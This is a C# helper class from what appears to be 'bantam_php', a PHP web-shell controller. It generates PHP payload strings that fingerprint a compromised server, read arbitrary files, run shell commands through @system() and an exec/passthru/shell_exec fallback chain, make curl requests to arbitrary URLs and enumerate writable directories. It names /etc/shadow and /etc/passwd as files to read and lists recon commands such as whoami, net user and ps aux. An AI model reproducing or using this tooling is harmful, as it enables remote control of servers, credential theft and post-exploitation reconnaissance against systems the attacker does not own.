using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace bantam_php
{
    class PhpHelper
    {
        /// <summary>
        /// 
        /// </summary>
        public const string rowSeperator = "|=$=|";

        /// <summary>
        /// 
        /// </summary>
        public const string colSeperator = ",.$.,";

        /// <summary>
        /// 
        /// </summary>
        public enum INIT_DATA_VARS
        {
            OS = 0,
            CWD,
            FREE_SPACE,
            TOTAL_SPACE,
            RELEASE,
            KERNEL,
            SERVER_IP,
            SERVER_SOFTWARE,
            USER,
            UID,
            GID,
            GROUP,
            PHP_VERSION
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        public static string minifyCode(string code)
        {
            string clean = Regex.Replace(code, @"\t|\n|\r", "");
            return Regex.Replace(clean, @"\s+", " ");
        }

        /// <summary>
        /// 
        /// </summary>
        public static string initDataVars = @"
            $os = 'nix';
            if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ $os = 'win'; }

            $cwd = @dirname(__FILE__);
            $freeSpace  = @diskfreespace($cwd);
            $totalSpace = @disk_total_space($cwd);
            $totalSpace = $totalSpace ? $totalSpace : 1;
            $release	= @php_uname('r');
            $kernel	 = @php_uname('s');
            $serverIP =  $_SERVER['SERVER_ADDR'];
            $serverSoftware = @getenv('SERVER_SOFTWARE');
            $phpVersion = phpversion();
		
            if (!function_exists('posix_getegid')) {
	            $user  = @get_current_user();
	            $uid   = @getmyuid();
	            $gid   = @getmygid();
	            $group = '?';
            } else {
	            $uid   = @posix_getpwuid(posix_geteuid());
	            $gid   = @posix_getgrgid(posix_getegid());

	            $user  = $uid['name'];
	            $uid   = $uid['uid'];
	            $gid   = $gid['gid'];
	            $group = $gid['name'];
            }
            echo $os.'" + colSeperator
             + "'.$cwd.'" + colSeperator
             + "'.$freeSpace.'" + colSeperator
             + "'.$totalSpace.'" + colSeperator
             + "'.$release.'" + colSeperator
             + "'.$kernel.'" + colSeperator
             + "'.$serverIP.'" + colSeperator
             + "'.$serverSoftware.'" + colSeperator
             + "'.$user.'" + colSeperator
             + "'.$uid.'" + colSeperator
             + "'.$gid.'" + colSeperator
             + "'.$group.'" + colSeperator
            + "'.$phpVersion;";

        public static string readFileProcedure(string fileName)
        {
            return "echo @is_readable('" + fileName + "') ? file_get_contents('" + fileName + "') : 'File Not Readable';";
        }

        public static string executeSystemCode(string code)
        {
            //todo: abstract now it's time to make the function that executes the code dynamic
            return "@system('" + code + "');";
        }

        public static string linuxFS_ShadowFile = "/etc/shadow";
        public static string linuxFS_PasswdFile = "/etc/passwd";
        public static string linuxFS_IssueFile = "/etc/issue.net";
        public static string linuxFS_hostTargetsFile = "/etc/hosts";
        public static string linuxFS_ProcVersion = "/proc/version";
        public static string linuxFS_NetworkInterfaces = "/etc/network/interfaces";

        public static string windowsFS_hostTargets = "C:\\Windows\\System32\\drivers\\etc\\hosts";

        public static string linuxOS_PsAux = "ps aux";
        public static string linuxOS_Ifconfig = "ifconfig";
        public static string windowsOS_Ipconfig = "ipconfig";
        public static string windowsOS_TaskList = "tasklist";
        public static string windowsOS_NetUser = "net user";
        public static string windowsOS_NetAccounts = "net accounts";
        public static string windowsOS_Ver = "ver";
        public static string posixOS_Whoami = "whoami";


        public static string phpInfo = "phpinfo();";

        public static string phpTestExecutionWithEcho = "echo '1';";

        /// <summary>
        /// 
        /// </summary>
        public static string osDetectPHP = "if(strtolower(substr(PHP_OS, 0, 3)) == 'win'){ echo 'win'; } else { echo 'nix'; }";

        /// <summary>
        /// 
        /// </summary>
        /// <param name="url"></param>
        /// <returns></returns>
        public static string getBasicCurl(string url)
        {
            return "$curl = curl_init();" +
                    "curl_setopt_array($curl, array(" +
                        "CURLOPT_SSL_VERIFYPEER => false," +
                        "CURLOPT_FOLLOWLOCATION => true," +
                        "CURLOPT_URL => '" + url + "'," +
                    "));" +
                    "curl_exec($curl);" +
                    "curl_close($curl);";
        }

        /// <summary>
        /// Code for windows Get HDD list, written with "@" as a verbatim literal to avoid escaping of \\'
        /// </summary>
        public static string getHardDriveLetters = @"foreach (range('a', 'z') as $drive) { if (is_dir($drive . ':\\')) { echo $drive.':|'; }}";

        /// <summary>
        /// 
        /// </summary>
        /// <param name="code"></param>
        /// <returns></returns>
        //    public static string executeSystemCode(string code)
        //    {
        //  return @"
        //        if (function_exists('exec')) {
        //            @exec($in, $out);
        //   echo @out;
        //        } elseif(function_exists('passthru')) {
        //            @passthru($in);
        //        } elseif(function_exists('system')) {
        //            @system($in);;
        //        } elseif(function_exists('shell_exec')) {
        //   echo @shell_exec($in);
        //        } elseif(is_resource($f = @popen($in, 'r'))) {
        //   $out = "";
        //            while (!@feof($f))
        //$out .= fread($f, 1024);
        //            pclose($f);
        //            echo $out;
        //        }";
        //    }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="location"></param>
        /// <param name="phpVersion"></param>
        /// <returns></returns>
        public static string getDirectoryEnumerationCode(string location, string phpVersion)
        {
            //We cannot use the lambda function in usort below php version 5.2 :(
            //TODO move this version holder / checker else where to a function
            string sortCode = "";
            string[] version = phpVersion.Split(new string[] { "." }, StringSplitOptions.None);
            if (version != null && version.Length >= 2) {
                if (Convert.ToInt32(version[0]) > 5
                || (Convert.ToInt32(version[0]) == 5 && Convert.ToInt32(version[1]) >= 3)) {
                    sortCode =
                    @" if(version_compare(phpversion(), '5.3.0', '>='))
                    {
                        if (!empty($dirs))
                        {
                            usort($dirs, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
                        }

                        if (!empty($files))
                        {
                            usort($files, function($a, $b){ return strcasecmp($a['name'], $b['name']); });
                        }
                    } ";
                }
            }

            return @"$dirs = $files = array();
	             function PermsColor($f) {
		            if (!@is_readable($f)) {
			            return 'red';
		            } elseif (!@is_writable($f)) {
			            return 'grey';
		            } else {
			            return 'green';
                    }
	            }
                try{ 
                    foreach (new DirectoryIterator('" + location + @"') as $item) {
			            if($item->getBasename() == '.') {
				            continue;
			            }

			            $tmp = array(
				            'name' => $item->getBasename(),
				            'path' => $item->getPath() . '/' . $item->getBasename(),
                            'perms' => PermsColor($item->getPathname())
			            );

			            if ($item->isFile()) {
				            $files[] = array_merge($tmp, array(
					            'type' => 'file',
                                'size' => $item->getSize()
				            ));
			            }
			            elseif ($item->isLink()) {
				            $dirs[] = array_merge($tmp, array(
					            'type' => 'link',
                                'size' => ''
				            ));
			            }
			            elseif ($item->isDir()) {
				            $dirs[] = array_merge($tmp, array(
					            'type' => 'dir',
                                'size' => ''
				            ));
			            }
		            }" + sortCode + @"

                    foreach ($dirs as $dir) {
                        echo $dir['name'] . '" + colSeperator
                        + @"'.$dir['path'].'" + colSeperator
                        + @"'.$dir['size'].'" + colSeperator
                        + @"'.$dir['type'].'" + colSeperator
                        + @"'.$dir['perms'].'" + rowSeperator + @"';
                    }
                    foreach($files as $file) {
                        echo $file['name'] . '" + colSeperator
                        + "'.$file['path'].'" + colSeperator
                        + "'.$file['size'].'" + colSeperator
                        + "'.$file['type'].'" + colSeperator
                        + "'.$dir['perms'].'" + rowSeperator + @"';
                    }
                }catch(Exception $e){  }";
        }

        public static string getTaskListFunction(bool windowsOS = true)
        {
            return (windowsOS) ? windowsOS_TaskList : linuxOS_PsAux;
        }
    }
}
